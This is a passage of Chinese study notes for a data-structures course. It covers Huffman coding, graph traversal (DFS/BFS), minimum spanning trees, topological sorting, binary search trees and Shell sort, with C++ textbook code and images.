(p);</span><br><span class="line">           visit(p);</span><br><span class="line">          <span class="keyword">if</span> (p-&gt;leftChild != <span class="literal">NULL</span>) Q.EnQueue (p-&gt;leftChild);</span><br><span class="line">          <span class="keyword">if</span> (p-&gt;rightChild != <span class="literal">NULL</span>) Q.EnQueue (p-&gt;rightChild);</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure>
<h3 id="二叉树的计数"><a href="#二叉树的计数" class="headerlink" title="二叉树的计数"></a>二叉树的计数</h3><p>由先序序列确定根结点，再由中序序列找出左右子树，可唯一确定一棵二叉树！</p>
<h2 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h2><p><strong>树的存储表示</strong>：树会转换成二叉树，通常用左子女，右兄弟来表示。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702164153548.png" alt="image-20200702164153548"></p>
<h3 id="森林和二叉树的转换"><a href="#森林和二叉树的转换" class="headerlink" title="森林和二叉树的转换"></a>森林和二叉树的转换</h3><p>森林转换为二叉树 </p>
<ol>
<li>将森林中的每棵树转换成二叉树；</li>
<li>从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵二叉树根结点的右孩子，当所有二叉树连起来后，此时所得到的二叉树就是由森林转换得到的二叉树。</li>
</ol>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702174727708.png" alt="image-20200702174727708"></p>
<h2 id="树与和森林的遍历"><a href="#树与和森林的遍历" class="headerlink" title="树与和森林的遍历"></a>树与和森林的遍历</h2><h3 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702203721802.png" alt="image-20200702203721802"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702203710965.png" alt="image-20200702203710965"></p>
<p>森林和树一样。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702204931378.png" alt="image-20200702204931378"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702204950852.png" alt="image-20200702204950852"></p>
<h3 id="广度优先遍历"><a href="#广度优先遍历" class="headerlink" title="广度优先遍历"></a>广度优先遍历</h3><p>森林的层次序遍历：</p>
<ol>
<li>依次遍历各棵树的根节点；</li>
<li>依次遍历各棵树根节点的所有子女；</li>
</ol>
<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><h3 id="路径长度"><a href="#路径长度" class="headerlink" title="路径长度"></a>路径长度</h3><p>路径长度：两个结点之间的路径长度 PL 是连接两结点的路径上的分支数。</p>
<p>树的路径长度：从树根到每一结点的路径长度之和。</p>
<p>树的带权路径长度：设树具有n个带权值的叶子结点，从根结点到各个叶子结点的路径长度与相应叶子结点权值的乘积之和。 记为：</p>
<p>$WPL=\sum_{k=1}^nW_kL_k$</p>
<h3 id="哈夫曼树-1"><a href="#哈夫曼树-1" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h3><p><strong>带权路径长度达到最小的扩充二叉树为哈夫曼树。</strong></p>
<p>特点为：</p>
<ol>
<li>权值越大的叶子结点越靠近根结点，而权值越小的叶子结点越远离根结点。</li>
<li>只有度为0（叶子结点）和度为2（分支结点）的结点，不存在度为1的结点。</li>
</ol>
<p><strong>若哈夫曼树有n个叶节点，则总结点为2n-1个。</strong></p>
<h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><p>哈夫曼编码用哈夫曼编码树来表示（左零右一）。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702230005801.png" alt="image-20200702230005801"></p>
<p>哈夫曼编码结果：$WPL=1bit7+2bit5+3bit6=35bit$</p>
<p>基本思想：<strong>概率大的字符用短码，概率小的用长码。</strong></p>
<p>练习：假设用于通信的电文仅由8个字母 {a, b, c, d, e, f, g, h} 构成，它们在电文中出现的概率分别为{ 0.07, 0.19, 0.02, 0.06, 0.32, 0.03, 0.21, 0.10}，试为这8个字母设计哈夫曼编码。如果用0～7的二进制编码方案又如何？</p>
<p>一般左面是小数，右面是大数。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702231339888.png" alt="image-20200702231339888"></p>
<p>$WPL＝2(0.19+0.32+0.21) + 4(0.07+0.06+0.10) +5(0.02+0.03)<br>                        =1.44+0.92+0.25=2.61 $</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p><strong>最小堆：任一结点的关键码均小于或等于它的左右子女的关键码，位于堆顶的结点的关键码是集合中最小的，所以称为最小堆。</strong></p>
<p><strong>最小堆的形成</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215517930.png" alt="image-20200703215517930"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215541647.png" alt="image-20200703215541647"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215550879.png" alt="image-20200703215550879"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215602757.png" alt="image-20200703215602757"></p>
<h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><p>有向图：图G中的每条边都是有方向的；</p>
<p>无向图：图G中的每条边都是无方向的；</p>
<p><strong>完全图</strong> ：图G任意两个顶点都有一条边相连接；<strong>若有 n 个顶点的无向图有 n(n-1)/2 条边, 则此图为完全无向图。</strong><br><strong>有 n 个顶点的有向图有n(n-1) 条边, 则此图为完全有向图。</strong></p>
<p><strong>顶点的度</strong>：一个顶点v的度是与它相关联的边的条数。</p>
<p>连通图与连通分量 ：在<strong>无向图</strong>中, 若从顶点v1到顶点v2有路径, 则称顶点v1与v2是连通的。如果图中任意一对顶点都是连通的, 则称此图是<strong>连通图</strong>。非连通图的极大连通子图叫做连通分量。</p>
<p>==这里要分清两个概念：极大连通子图（连通分量）和极小连通子图（生成树）==</p>
<p><strong>极大连通子图</strong></p>
<ol>
<li>连通图只有一个极大连通子图，就是它本身</li>
<li>非连通图的极大连通子图就叫连通分量，每个分量都是一个连通图。</li>
</ol>
<p><strong>极小连通子图</strong></p>
<ol>
<li>一个连通图的生成树就是极小连通子图，并且极小联通子图只存在于<strong>连通图中</strong>。</li>
<li>最明显的特点是n个结点，n-1条边。</li>
</ol>
<p>强连通图与强连通分量 ：在<strong>有向图</strong>中, 若对于每一对顶点vi和vj, 都存在一条从vi到vj和从vj到vi的路径, 则称此图是<strong>强连通图</strong>。非强连通图的极大强连通子图叫做强连通分量。</p>
<p><strong>生成树  ：一个连通图的生成树是其极小连通子图，在 n 个顶点的情形下，有 n-1 条边。</strong></p>
<h2 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h2><h3 id="邻接矩阵表示"><a href="#邻接矩阵表示" class="headerlink" title="邻接矩阵表示"></a>邻接矩阵表示</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004031516.png" alt="image-20200703004031516"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004326822.png" alt="image-20200703004326822"></p>
<p>特点：完全图的邻接矩阵中，对角元素全为0，其余全为1。</p>
<p><strong>网络的邻接矩阵</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004532397.png" alt="image-20200703004532397"></p>
<p><strong>邻接矩阵法优点：</strong></p>
<p>容易实现图的操作，如：求某顶点的度、判断顶点之间是否有边（弧）、找顶点的邻接点等等。</p>
<p><strong>邻接矩阵法缺点：</strong></p>
<p>n个顶点需要n*n个单元存储边(弧);空间效率为O(n2)。 对稀疏图而言尤其浪费空间。</p>
<h3 id="邻接表表示"><a href="#邻接表表示" class="headerlink" title="邻接表表示"></a>邻接表表示</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703005244186.png" alt="image-20200703005244186"></p>
<p>特点：若图中有n个顶点，a条边</p>
<ol>
<li>无向图中，用邻接表表示，需要n个顶点结点，2a个边结点。</li>
<li>有向图中，用邻接表表示，若不考虑逆邻接表，只需 n 个顶点结点，a 个边结点。</li>
</ol>
<p><strong>网络的邻接表</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703010111783.png" alt="image-20200703010111783"></p>
<h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><h3 id="深度优先遍历（DFS）"><a href="#深度优先遍历（DFS）" class="headerlink" title="深度优先遍历（DFS）"></a>深度优先遍历（DFS）</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703011229751.png" alt="image-20200703011229751"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//连通图的深度遍历 </span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">E</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">DFS</span> (<span class="title">Graph</span>&lt;T, E&gt;&amp; <span class="title">G</span>, <span class="title">int</span> <span class="title">v</span>, <span class="title">bool</span> <span class="title">visited</span>[]) &#123;</span>     </span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; G.getValue(v) &lt;&lt; <span class="string">' '</span>;        <span class="comment">//访问顶点v     </span></span><br><span class="line">	visited[v] = <span class="literal">true</span>;            <span class="comment">//作访问标记     </span></span><br><span class="line">	<span class="keyword">int</span> w = G.getFirstNeighbor (v);     <span class="comment">//第一个邻接顶点     </span></span><br><span class="line">	<span class="keyword">while</span> (w != <span class="number">-1</span>) &#123; <span class="comment">//若邻接顶点w存在       </span></span><br><span class="line">		<span class="keyword">if</span> ( !visited[w] ) DFS(G, w, visited);   <span class="comment">//若w未访问过, 递归访问顶点w         </span></span><br><span class="line">	w = G.getNextNeighbor (v, w); <span class="comment">//下一个邻接顶点    </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//图的深度优先搜索算法 </span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">E</span>&gt;  </span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">DFSTraverse</span> (<span class="title">Graph</span>&lt;T, E&gt;&amp; <span class="title">G</span>, <span class="title">const</span> <span class="title">T</span>&amp; <span class="title">v</span>) &#123;</span> </span><br><span class="line"><span class="comment">//从顶点v出发对图G进行深度优先遍历的主过程     </span></span><br><span class="line">	<span class="keyword">int</span> i, loc, n = G.NumberOfVertices();    <span class="comment">//顶点个数    </span></span><br><span class="line">	<span class="keyword">bool</span> *visited = <span class="keyword">new</span> <span class="keyword">bool</span>[n];          <span class="comment">//创建辅助数组     </span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) visited [i] = <span class="literal">false</span>; <span class="comment">//辅助数组初始化     </span></span><br><span class="line">	loc = G.getVertexPos(v);    </span><br><span class="line">	DFS (G, loc, visited); <span class="comment">//从顶点0开始深度优先搜索  </span></span><br><span class="line">	<span class="keyword">delete</span> [] visited;           <span class="comment">//释放visited </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="广度优先遍历（BFS）"><a href="#广度优先遍历（BFS）" class="headerlink" title="广度优先遍历（BFS）"></a>广度优先遍历（BFS）</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703012717115.png" alt="image-20200703012717115"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//图的广度优先搜索算法 </span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">E</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">BFS</span> (<span class="title">Graph</span>&lt;T, E&gt;&amp; <span class="title">G</span>, <span class="title">const</span> <span class="title">T</span>&amp; <span class="title">v</span>) &#123;</span>     </span><br><span class="line">	<span class="keyword">int</span> i, w, n = G.NumberOfVertices();   <span class="comment">//图中顶点个数   </span></span><br><span class="line">	<span class="keyword">bool</span> *visited = <span class="keyword">new</span> <span class="keyword">bool</span>[n];     </span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) visited[i] = <span class="literal">false</span>;     </span><br><span class="line">	<span class="keyword">int</span> loc = G.getVertexPos (v);  <span class="comment">//取顶点号     </span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; G.getValue (loc) &lt;&lt; <span class="string">' '</span>;  <span class="comment">//访问顶点v    </span></span><br><span class="line">	visited[loc] = <span class="literal">true</span>;           <span class="comment">//做已访问标记            </span></span><br><span class="line">	Queue&lt;<span class="keyword">int</span>&gt; Q;  </span><br><span class="line">  Q.EnQueue (loc);   <span class="comment">//顶点进队列, 实现分层访问 图的广度优先搜索算法 </span></span><br><span class="line">	<span class="keyword">while</span> (!Q.IsEmpty()) &#123; <span class="comment">//循环, 访问所有结点         </span></span><br><span class="line">		Q.DeQueue (loc);         </span><br><span class="line">		w = G.getFirstNeighbor (loc);  <span class="comment">//第一个邻接顶点         </span></span><br><span class="line">		<span class="keyword">while</span> (w != <span class="number">-1</span>) &#123;  <span class="comment">//若邻接顶点w存在            </span></span><br><span class="line">			<span class="keyword">if</span> (!visited[w]) &#123;  <span class="comment">//若未访问过  </span></span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; G.getValue (w) &lt;&lt; ‘ ’; <span class="comment">//访问           </span></span><br><span class="line">				visited[w] = <span class="literal">true</span>;               </span><br><span class="line">				Q.EnQueue (w);   <span class="comment">//顶点w进队列                </span></span><br><span class="line">			&#125;           </span><br><span class="line">			w = G.getNextNeighbor (loc, w); <span class="comment">//找顶点loc的下一个邻接点         </span></span><br><span class="line">		&#125; </span><br><span class="line">	&#125;  </span><br><span class="line"><span class="keyword">delete</span> [] visited; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703020829072.png" alt="image-20200703020829072"></p>
<p>画出该图的DFS和BFS生成树</p>
<p>DFS：</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703020930287.png" alt="image-20200703020930287"></p>
<p>BFS：<img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021006557.png" alt="image-20200703021006557"></p>
<h3 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h3><p>特点：将顶点归并</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021313306.png" alt="image-20200703021313306"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021437904.png" alt="image-20200703021437904"></p>
<h3 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h3><p>特点：将边归并</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021202383.png" alt="image-20200703021202383"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021225017.png" alt="image-20200703021225017"></p>
<h2 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h2><h3 id="非负权值的单源最短路径"><a href="#非负权值的单源最短路径" class="headerlink" title="非负权值的单源最短路径"></a>非负权值的单源最短路径</h3><p><strong>Dijkstra算法</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703022317587.png" alt="image-20200703022317587"></p>
<h2 id="AOV网"><a href="#AOV网" class="headerlink" title="AOV网"></a>AOV网</h2><p><strong>AOV网</strong>：在一个有向图中，用顶点表示活动，用有向边表示活动先后次序的执行。这种有向图叫做顶点表示活动的AOV网络。</p>
<p><strong>拓扑排序</strong>：按照有向图给出的次序关系，将图中顶点排成一个线性序列，对于有向图中没有限定次序关系的顶点，则可以人为加上任意的次序关系。<strong>由此所得顶点的线性序列称为拓扑有序序列</strong>，<strong>构造有向图的一个拓扑序列的过程称为拓扑排序</strong>。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024430846.png" alt="image-20200703024430846"></p>
<p>eg：</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024708515.png" alt="image-20200703024708515"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024726671.png" alt="image-20200703024726671"></p>
<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><h2 id="折半搜索"><a href="#折半搜索" class="headerlink" title="折半搜索"></a>折半搜索</h2><p><strong>基本思想</strong>：折半搜索时, 先求位于搜索区间正中的对象的下标mid，用其关键码与给定值x比较:Element[mid].key == x，搜索成功；Element[mid].key &gt; x，把搜索区间缩小到表的前半部分，继续折半搜索；Element[mid].key &lt; x，把搜索区间缩小到表的后半部分，继续折半搜索。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703221308152.png" alt="image-20200703221308152"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703221322312.png" alt="image-20200703221322312"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinSearch1</span><span class="params">(<span class="keyword">int</span> r[ ], <span class="keyword">int</span> n, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;                                  <span class="comment">//数组r[1] ~ r[n]存放查找集合</span></span><br><span class="line">    low = <span class="number">1</span>; high = n;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high)                   </span><br><span class="line">    &#123;</span><br><span class="line">       mid = (low + high) / <span class="number">2</span>;            </span><br><span class="line">       <span class="keyword">if</span> (k &lt; r[mid])  high = mid - <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (k &gt; r[mid])  low = mid + <span class="number">1</span>; </span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinSearch2</span><span class="params">(<span class="keyword">int</span> r[ ], <span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;                              <span class="comment">//数组r[1] ~ r[n]存放查找集合</span></span><br><span class="line">    <span class="keyword">if</span> (low &gt; high) <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">       mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">if</span> (k &lt; r[mid]) </span><br><span class="line">           <span class="keyword">return</span> BinSearch2(r, low, mid<span class="number">-1</span>, k);</span><br><span class="line">       <span class="keyword">else</span>  <span class="keyword">if</span> (k &gt; r[mid]) </span><br><span class="line">                   <span class="keyword">return</span> BinSearch2(r, mid+<span class="number">1</span>, high, k); </span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h2 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2><p>定义：二叉搜索树是具有以下性质的二叉树</p>
<ol>
<li>所有结点的关键码互不相同。</li>
<li>左子树（如果非空）上所有结点的关键码都小于根结点的关键码。</li>
<li>右子树（如果非空）上所有结点的关键码都大于根结点的关键码。</li>
<li>左子树和右子树也是二叉搜索树。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//搜索算法</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">E</span>, <span class="title">class</span> <span class="title">K</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">BSTNode</span>&lt;E, K&gt;* <span class="title">BST</span>&lt;E, K&gt;:</span>: Search (<span class="keyword">const</span> K x, BSTNode&lt;E, K&gt; *ptr) </span><br><span class="line">&#123;     </span><br><span class="line">	<span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (x &lt; ptr-&gt;data) <span class="keyword">return</span> Search(x, ptr-&gt;left);     </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (x &gt; ptr-&gt;data) <span class="keyword">return</span> Search(x, ptr-&gt;right);     </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> ptr;    <span class="comment">//搜索成功 </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="二叉搜索树的插入"><a href="#二叉搜索树的插入" class="headerlink" title="二叉搜索树的插入"></a>二叉搜索树的插入</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">E</span>, <span class="title">class</span> <span class="title">K</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">BST</span>&lt;E, K&gt;:</span>:Insert (<span class="keyword">const</span> E&amp; e1,   BSTNode&lt;E, K&gt; *&amp; ptr)</span><br><span class="line"> &#123;	  <span class="comment">//注意参数形式 </span></span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) &#123;	   <span class="comment">//新结点作为叶结点插入</span></span><br><span class="line">        ptr = <span class="keyword">new</span> BstNode&lt;E, K&gt;(e1);	  <span class="comment">//创建新结点</span></span><br><span class="line">        <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)&#123; <span class="built_in">cerr</span> &lt;&lt; <span class="string">"Out of space"</span> &lt;&lt; <span class="built_in">endl</span>;  <span class="built_in">exit</span>(<span class="number">1</span>); &#125;</span><br><span class="line">	    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (e1 &lt; ptr-&gt;data) <span class="keyword">return</span> Insert (e1, ptr-&gt;left);	 			 </span><br><span class="line">  	<span class="keyword">else</span> <span class="keyword">if</span> (e1 &gt; ptr-&gt;data) <span class="keyword">return</span> Insert (e1, ptr-&gt;right);			 </span><br><span class="line">  	<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">//x已在树中,不再插入</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223024868.png" alt="image-20200703223024868"></p>
<h3 id="二叉搜索树的删除"><a href="#二叉搜索树的删除" class="headerlink" title="二叉搜索树的删除"></a>二叉搜索树的删除</h3><p>有三种情况：</p>
<ol>
<li>被删的结点是叶子</li>
<li>被删结点只有左子树或只有右子树</li>
<li>被删结点既有左子树又有右子树</li>
</ol>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223603100.png" alt="image-20200703223603100"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223624325.png" alt="image-20200703223624325"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223643364.png" alt="image-20200703223643364"></p>
<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703030054652.png" alt="image-20200703030054652"></p>
<h2 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h2><p><strong>基本思想：在插入第 i（i＞1）个记录时，前面的 i-1个记录已经排好序。</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703200120034.png" alt="image-20200703200120034"></p>
<p><strong>平均情况下排序的时间复杂度为 o(n2)。<br>直接插入排序是一种稳定的排序方法。</strong></p>
<h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><p><strong>基本思想：将整个待排序记录分割成若干个子序列，在子序列内分别进行直接插入排序，待整个序列中的记录基本有序时，对全体记录进行直接插入排序。</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201115198.png" alt="image-20200703201115198"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201212433.png" alt="image-20200703201212433"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201232582.png" alt="image-20200703201232582"></p>
<p>gap通常取：</p>
<p>$gap=\lfloor gap/3\rfloor+1$</p>
<p><strong>希尔排序是一种不稳定的排序算法。</strong></p>
<p>eg：</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201916100.png" alt="image-20200703201916100"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//希尔排序的算法</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shellsort</span> <span class="params">(dataList&lt;T&gt;&amp; L, <span class="keyword">const</span> <span class="keyword">int</span> left, <span class="keyword">const</span> <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"> </span>&#123; <span class="keyword">int</span> i, j, gap = right-left+<span class="number">1</span>; <span class="comment">//增量的初始值为待排序个数</span></span><br><span class="line">	Element&lt;T&gt; temp;</span><br><span class="line">    <span class="keyword">do</span> &#123;  	gap = gap/<span class="number">3</span>+<span class="number">1</span>;			<span class="comment">//求下一增量值</span></span><br><span class="line">        		<span class="keyword">for</span>(i=left+gap;i&lt;=right;i++)</span><br><span class="line">           	 	<span class="keyword">if</span> (L[i]&lt;L[i-gap]) &#123;<span class="comment">//逆序</span></span><br><span class="line">                			temp=L[i];</span><br><span class="line">                			j = i-gap;</span><br><span class="line">                			<span class="keyword">do</span> &#123;</span><br><span class="line">                   			L[j+gap] = L[j];</span><br><span class="line">                        j= j-gap;</span><br><span class="line">                			&#125; <span class="keyword">while</span> (j&gt;=left &amp;&amp; temp&lt;L[j]);</span><br><span class="line">               			L[j+gap]=temp;	<span class="comment">//将vector[i]回送</span></span><br><span class="line">           		&#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (gap &gt; <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
